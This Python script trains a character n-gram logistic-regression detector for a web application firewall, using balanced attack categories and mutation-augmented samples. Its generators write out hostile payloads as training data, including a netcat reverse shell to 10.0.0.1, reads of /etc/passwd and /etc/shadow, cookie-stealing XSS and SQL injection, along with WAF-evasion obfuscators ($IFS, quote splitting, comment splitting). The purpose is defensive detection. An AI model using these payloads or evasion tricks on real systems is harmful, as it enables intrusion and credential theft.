#!/usr/bin/env python3
"""Per-category-balanced + mutation-augmented training.

Fixes the calibration bug in train_mutaug.py: a flat cap + shuffle over the
evasion corpus let the two huge classes (traversal 43k, lfi 31k) crowd out the
classes we actually score poorly on (shell/cmdi, xss-evasion, sqli-evasion,
ssti). Here each attack CLASS gets a balanced per-category quota — the weak
detection classes are boosted, the over-represented ones capped — so the model
learns every injection structure, not just path traversal.

Also: a shell/command-injection generator (the inference path now canonicalises
$IFS/backslash/quote/whitespace/SQL-comment obfuscation, so training the model on
the CLEAN command forms + mutation-augmented obfuscated forms lets the two meet),
and a lower C (stronger L2) to hold TN.

Featurization is BYTE-IDENTICAL to train_mutaug.py and to the Rust inference path
(ngram_classifier.rs): lowercase UTF-8, char n-grams NS=[2,3,4], FNV-1a32 % K,
binary presence. GoTestWAF is NEVER trained on.

Usage: train_balanced.py [K] [OUT.json]
"""
import csv, glob, re, random, os, sys, urllib.parse
import numpy as np
from sklearn.linear_model import LogisticRegression
from scipy import sparse

K = int(sys.argv[1]) if len(sys.argv) > 1 else 16384
OUT = sys.argv[2] if len(sys.argv) > 2 else "payload_ngram_balanced.json"
NS = [2, 3, 4]; MAXLEN = 512
C_REG = 0.4  # stronger L2 than mutaug's 0.5 — holds TN under the boosted attack set
OLD = "/tmp/claude-1000/-home-ayush3750-waf-development/24905267-7ca1-4d87-9e75-328eeac4243f/scratchpad/ml-corpus"
EVA = "/tmp/claude-1000/-home-ayush3750-waf-development/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/evasion-corpus"
HARD = "/tmp/claude-1000/-home-ayush3750-waf-development/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/hard-benign"
BEN = "/tmp/claude-1000/-home-ayush3750-waf-development/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/benign-corpus"
rng = random.Random(1337)
FNV=2166136261; PR=16777619; M=0xFFFFFFFF
_HC={}
def bk(ng):
    v=_HC.get(ng)
    if v is None:
        h=FNV
        for x in ng: h^=x; h=(h*PR)&M
        v=h%K; _HC[ng]=v
    return v
def buckets(t):
    b=t.lower()[:MAXLEN].encode("utf-8","ignore"); n=len(b); s=set()
    for ng in NS:
        for i in range(n-ng+1): s.add(bk(b[i:i+ng]))
    return s
def matrix(ts):
    rows=[];cols=[]
    for r,t in enumerate(ts):
        for c in buckets(t): rows.append(r); cols.append(c)
    return sparse.csr_matrix((np.ones(len(rows),np.float32),(rows,cols)),shape=(len(ts),K))
def lines(f):
    if not os.path.exists(f): return []
    return [l.rstrip("\n").rstrip("\r") for l in open(f,encoding="utf-8",errors="ignore")
            if l.strip() and not l.startswith("#") and not l.lower().startswith("404:")]

# ---- per-category balanced load of the evasion corpus ----
# Quotas: BOOST the classes we score poorly on (xss/cmdi/sqli/ssti), CAP the two
# that dominate the raw corpus (traversal 43k, lfi 31k) so they stop crowding out
# the rest. Small classes take everything they have.
CAT_QUOTA = {
    "xss": 7000, "cmdi": 6000, "sqli": 3200, "ssti": 2200,
    "lfi": 5000, "traversal": 3000, "xxe": 1000, "ldap": 500,
    "nosqli": 500, "crlf": 500,
}
def load_by_category():
    by_cat = {}
    for f in sorted(glob.glob(f"{EVA}/*.txt")):
        cat = os.path.basename(f).split("_", 1)[0]
        by_cat.setdefault(cat, []).extend(lines(f))
    out = []
    for cat, quota in CAT_QUOTA.items():
        pool = [a for a in dict.fromkeys(by_cat.get(cat, [])) if 3 <= len(a) <= MAXLEN]
        rng.shuffle(pool)
        take = pool[:quota]
        out += take
        print(f"  cat {cat:10s}: have {len(pool):6d}  take {len(take):6d}")
    return out

def load_dir(d, cap, exclude=None):
    out=[]
    for f in sorted(glob.glob(f"{d}/*.txt")):
        if exclude and exclude in os.path.basename(f): continue
        out+=lines(f)
    out=[a for a in dict.fromkeys(out) if 3<=len(a)<=MAXLEN]; rng.shuffle(out)
    return out[:cap]

# ---- mutation engine (all deterministic; no runaway loops) ----
def url_enc(s):       return urllib.parse.quote(s, safe='')
def url_enc_part(s):  return ''.join('%%%02X'%ord(c) if c in '<>\'"();&|=/ *' and ord(c)<128 else c for c in s)
def double_url(s):    return url_enc(url_enc(s))
def entity_enc(s):    return ''.join('&#%d;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def entity_hex(s):    return ''.join('&#x%x;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def rand_case(s):     return ''.join(c.upper() if rng.random()<0.5 else c.lower() for c in s)
def sql_comment(s):   return s.replace(' ', '/**/')
def ws_vary(s):       return s.replace(' ', rng.choice(['\t','\n','\x0b','\x0c','  ','+','%20']))
def kw_split(s):
    m=re.search(r'[A-Za-z]{5,}', s)
    if not m: return s
    i=m.start()+len(m.group())//2
    return s[:i]+'/**/'+s[i:]
def ifs_sub(s):       return s.replace(' ', rng.choice(['${IFS}','$IFS$9','${IFS%??}']))
def shell_quote(s):   # break alpha runs with empty quotes: cat -> c""at
    m=re.search(r'[A-Za-z]{3,}', s)
    if not m: return s
    i=m.start()+1
    return s[:i]+rng.choice(["''",'""'])+s[i:]
MUTATORS=[url_enc, url_enc_part, double_url, entity_enc, entity_hex, rand_case,
          sql_comment, ws_vary, kw_split, ifs_sub, shell_quote]

def augment_attacks(base, per=4):
    out=set(base)
    for p in base:
        for f in rng.sample(MUTATORS, per):
            try:
                m=f(p)
                if 3<=len(m)<=MAXLEN: out.add(m)
            except Exception:
                pass
    return list(out)

# ---- generated structural attacks (capped) ----
def gen_xss(n):
    tg=["script","img","svg","iframe","body","a","div","details","object","video","input","form","style","math","marquee"]
    ev=["onload","onerror","onclick","onmouseover","ontoggle","onpointerover","onfocus","onanimationstart","onbeforetoggle"]
    js=["alert(1)","alert(document.cookie)","prompt(1)","confirm(1)","eval(name)","fetch('//x')","alert`1`","(alert)(1)"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;t=rng.choice(tg);e=rng.choice(ev);p=rng.choice(js)
        o.add(rng.choice([f"<{t} {e}={p}>",f"<{t}>{p}</{t}>",f'"><{t} {e}={p}>',f"javascript:{p}",f"<{t} src=x {e}={p}>",f"<svg><script>{p}</script></svg>"]))
    return list(o)
def gen_sqli(n):
    pre=["","'",'"',") ","1' ","admin' ","') ",'" '];bd=["OR 1=1","OR '1'='1","UNION SELECT NULL","UNION SELECT username,password FROM users","AND SLEEP(5)","; DROP TABLE users","AND updatexml(1,concat(0x7e,user()),1)","OR 1=1-- -","UNION ALL SELECT 1,2,3","; WAITFOR DELAY '0:0:5'"];sf=["","-- -"," #","/*","%00"]
    o=set();k=0
    while len(o)<n and k<n*80: k+=1;o.add((rng.choice(pre)+rng.choice(bd)+rng.choice(sf)).strip())
    return list(o)
def gen_cmdi(n):
    # Clean command-injection forms; mutation augmentation adds the $IFS/quote/
    # backslash-obfuscated variants that inference canonicalises back to these.
    sep=[";","|","||","&&","&","\n","`","$(",")","%0a"]
    cmd=["cat /etc/passwd","id","whoami","uname -a","ls -la /","curl http://x/","wget http://x/","nc -e /bin/sh 10.0.0.1 4444",
         "ping -c 4 127.0.0.1","sleep 5","cat /etc/shadow","python -c 'import os'","bash -i","/bin/sh -i","echo vuln","rm -rf /tmp/x"]
    pre=["","127.0.0.1","test","file.txt","1","admin"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;s=rng.choice(sep);c=rng.choice(cmd);p=rng.choice(pre)
        o.add(rng.choice([f"{p}{s}{c}",f"{p} {s} {c}",f"$({c})",f"`{c}`",f"{p};{c};",f"|{c}"]))
    return list(o)

# ---- assemble attacks ----
print("loading evasion corpus (per-category balanced)...", flush=True)
base_atk = load_by_category() + gen_xss(3000) + gen_sqli(3000) + gen_cmdi(3000)
base_atk = list(dict.fromkeys([a for a in base_atk if a]))
atk = augment_attacks(base_atk, per=4)
print(f"attacks: {len(base_atk)} base -> {len(atk)} mutation-augmented", flush=True)

# ---- benign: real legit code (hard) + FWAF + adversarial + SOME encoded-benign
hard = load_dir(HARD, 14000, exclude="prose_security")
fwaf = load_dir(BEN, 20000)
hp_rows = list(csv.DictReader(open(f"{OLD}/HttpParamsDataset/payload_train.csv")))
hp_ben = [r["payload"] for r in hp_rows if r["label"]=="norm"]
def adv_benign(n):
    NOUN=["order","report","table","user","account","product","script","form","menu","update","group","query","filter","comment","profile","file","project","category"]
    VERB=["select","update","insert","delete","join","drop","order","union","alert","print","sort","filter","submit"]
    CONN=["and","or","from","where","by","null","between","having","like"]
    o=set();k=0;w=lambda:rng.choice(NOUN)
    while len(o)<n and k<n*40:
        k+=1;r=rng.random()
        if r<.4: s=f"please {rng.choice(VERB)} the {w()} {rng.choice(CONN)} {w()}"
        elif r<.7: s=f"{rng.choice(VERB)} {w()} {rng.choice(CONN)} {w()} = {w()}"
        else: s=rng.choice([f"x=({rng.randint(0,99)}+{rng.randint(0,99)})*2",f"a && b || c",f"{{{{ {w()}.{w()} }}}}",f"${{{w()}}}"])
        o.add(s)
    return list(o)
adv = adv_benign(6000)
# Encoded-benign so the model learns that URL-encoding is TRANSPORT, not an attack
# signal. Two forms: PARTIAL (url_enc_part, only special chars) and FULL
# (quote(safe=''), every non-alnum -> %XX). The full form is essential: real
# clients send fully-url-encoded form/query bodies, and without it the model
# reads dense %XX as an attack and false-positives on encoded benign traffic.
# Also include form-wrapped (`field=<encoded>`) benign so the raw form-body blob
# the scorer sees is represented. Generic robustness — NOT GoTestWAF payloads.
enc_pool = rng.sample(hard+fwaf, min(8000, len(hard)+len(fwaf)))
enc_benign = [url_enc_part(b) for b in enc_pool[:4000]]
enc_full = [url_enc(b) for b in enc_pool]
form_benign = [f"{rng.choice(['q','field','data','input','name','value','text'])}={url_enc(b)}"
               for b in rng.sample(hard+fwaf+adv, min(4000, len(hard)+len(fwaf)+len(adv)))]
ben = hard + fwaf + hp_ben + adv + enc_benign + enc_full + form_benign

allX = atk + ben
allY = np.r_[np.ones(len(atk),np.float32), np.zeros(len(ben),np.float32)]
print(f"train: {len(allX)} ({len(atk)} atk / {len(ben)} benign [{len(hard)} hard + {len(fwaf)} fwaf + {len(hp_ben)} hp + {len(adv)} adv + {len(enc_benign)} enc-part + {len(enc_full)} enc-full + {len(form_benign)} form])", flush=True)
print(f"featurizing (C={C_REG})...", flush=True)
clf=LogisticRegression(C=C_REG,class_weight="balanced",max_iter=4000,solver="liblinear").fit(matrix(allX), allY)

# quick sanity (NOT a GoTestWAF predictor)
def rec(g): return (clf.predict_proba(matrix(g))[:,1]>=0.9).mean()*100
print(f"  sanity gen-XSS recall@0.9 = {rec(gen_xss(400)):.1f}%   gen-SQLi = {rec(gen_sqli(400)):.1f}%   gen-CMDi = {rec(gen_cmdi(400)):.1f}%")
print(f"  sanity hard-code benign FP@0.9 = {rec(rng.sample(hard,2000)):.2f}%   fwaf FP@0.9 = {rec(rng.sample(fwaf,2000)):.2f}%")

w=clf.coef_.ravel().astype(float).tolist(); b=float(clf.intercept_.ravel()[0])
import json
json.dump({"version":1,"k":K,"ngrams":NS,"hash":"fnv1a32","normalize":"lower_utf8","bias":b,"weights":w}, open(OUT,"w"))
print(f"exported {OUT} (k={K}, bias={b:.4f})", flush=True)
